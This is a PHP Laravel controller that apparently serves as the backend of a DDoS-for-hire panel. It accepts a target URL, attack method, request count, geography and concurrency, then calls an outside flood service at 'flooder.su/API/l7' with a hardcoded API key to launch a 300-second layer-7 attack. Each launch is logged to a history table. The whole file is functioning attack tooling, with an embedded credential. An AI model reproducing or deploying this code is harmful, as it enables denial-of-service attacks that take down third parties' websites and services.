<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use App\Models\History;

class ApiController extends Controller
{
    public function submit(Request $request)
    {
        set_time_limit(300); // Allow 5 minutes for execution

        $request->validate([
            'host' => 'required|url',
            'method' => 'required|string',
            'rmethod' => 'required|string',
            'header' => 'required|string',
            'request' => 'required|integer',
            'geo' => 'required|string',
            'concurrents' => 'required|string',
        ]);

        $url = 'https://flooder.su/API/l7';
        $params = [
            'api_key' => 'f716e197-43942b79-6b3bbb8a-9f56ad44',
            'host' => $request->input('host'),
            'time' => 300,
            'method' => $request->input('method'), 
            'rmethod' => $request->input('rmethod'),
            'data' => '',
            'header' => $request->input('header'),
            'request' => $request->input('request'),
            'geo' => $request->input('geo'),
            'concurrents' => $request->input('concurrents'),
        ];

        try {
            $response = Http::get($url, $params);
            $responseBody = $response->json();

            History::create([
                'status' => $responseBody['status'] ?? null,
                'msg' => $responseBody['msg'] ?? null,
                'api_id' => $responseBody['id'] ?? null,
                'params' => json_encode($responseBody['params'] ?? []),
            ]);

            return redirect()->back()->with('success', 'API request was successful.');
        } catch (\Exception $e) {
            return redirect()->back()->with('error', 'API request failed. Error: ' . $e->getMessage());
        }
    }


    public function getHistory()
    {
        $history = History::orderBy('created_at')->get();
        return response()->json($history);
    }



}
